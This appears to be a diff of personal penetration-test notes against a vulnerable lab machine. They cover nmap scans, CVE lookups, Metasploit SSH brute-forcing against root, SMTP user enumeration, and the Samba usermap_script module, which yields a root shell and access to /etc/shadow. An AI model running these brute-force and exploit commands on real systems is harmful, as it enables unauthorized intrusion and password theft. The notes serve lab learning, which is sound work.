@@ -15,7 +15,7 @@ scan the target using nmap
 Nmap -sV -Sc <machine ip>  get 12 open ports 21 -22-23-25-53-80-139-445-3306-5430-8009
  
   
-now lets walkthough each port and see what we can do :
+now lets walkthough each port and see what we can do (sepratly and combined ):
 ----
 
 PORT  ::  STATE  ::  SERVICE ::  VERSIO
@@ -69,9 +69,96 @@ checking to see if this ftp supports excuting command through " SITE EXEC comman
 it seems like it does not support that 
 
 so far we got valid credintaial for ftp with no ablility to excute commands or existance of sensitve files
-
+ perform another intensive scan for the ftp , found potential vuln
+ 
+ CVE-2011-4130 CVSS 9.0
+ ---
+ 
+allows remote authenticated users to execute arbitrary code , let's give it a shot 
+ unfortentally there are no proof of concept or working exploit availabe online also there is no metasploit module for it
+ 
+ so let's move on
+ 
+ 
 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
 ----
 trying the same credintial of fttp for ssh it works :D 
 
   now we can excute files on the machine  
+ 
+ get step back and use nmap scropt engine for inteinsive scanning for port22
+ 
+ nmap -sV -sC 192.168.1.3 -p 22 --script vuln get some result 
+ 
+ CVE-2011-1013 CVSS 7.2
+---
+ allows local users to cause a denial of service (system crash)
+
+ CVE-2010-4478 CVSS 7.5
+---
+ which allows remote attackers to bypass the need for knowledge of the shared secret, and successfully authenticate
+ 
+  unfortentally there are no proof of concept or working exploit availabe online also there are no metasploit module for them
+ 
+ so i've moved to another approched " brute forcing the service for root credintials " using metaspolit
+ ---
+ msf > use auxiliary/scanner/ssh/ssh_login
+ 
+msf auxiliary(ssh_login) > set RHOSTS 10.0.0.27
+ 
+RHOSTS => 192.168.1.3
+ 
+msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+ 
+USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+ 
+
+ msf auxiliary(ssh_login) > run
+ 
+ no promising results , so lets move forward 
+ 
+23/tcp   open  telnet      Linux telnetd
+---
+ nmap
+
+  nmap -sV -sC 192.168.1.3 -p 23 --script vuln get some result
+ saerchsplit for telnet linux 
+ coulden't verfy that the service is vulnerable 
+
+ 25/tcp   open  smtp        Postfix smtpd
+ -----
+ 
+ nmap -sV -sC 192.168.1.3 -p 23 --script vuln get some result
+ the service is vurnalble to two mitm attacks (which i skiped) 
+ enumerating the user using smpt-user-enum tool getting me this result 
+ --
+ 
+ 192.168.1.3:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data
+
+bruteforcing the password using hydra but authentication not enabled on the server 
+ 
+ 53/tcp   open  domain      ISC BIND 9.4.2
+----
+ using nmap engine found CVE-2008-0122 CSSV 10.0 vulnebilitys that causes Denial Of ServiceExecute CodeMemory corruption
+
+ 
+ There are not any metasploit modules related to this CVE or any working online exploit
+ 
+ 
+ 
+ 80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
+---
+ running nmap , searching edb and mfs couldn't verfy vulnerability for the exact version of the service
+ 
+ 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+----
+ saerching exploit database for Samba getting me MSF module that returns a root shell 
+ > use exploit/multi/samba/usermap_script
+> set RHOST 192.168.1.3
+> exploit 
+
+ who ami >> root 
+ sudo/etc/shadow :D 
+ 
+ 
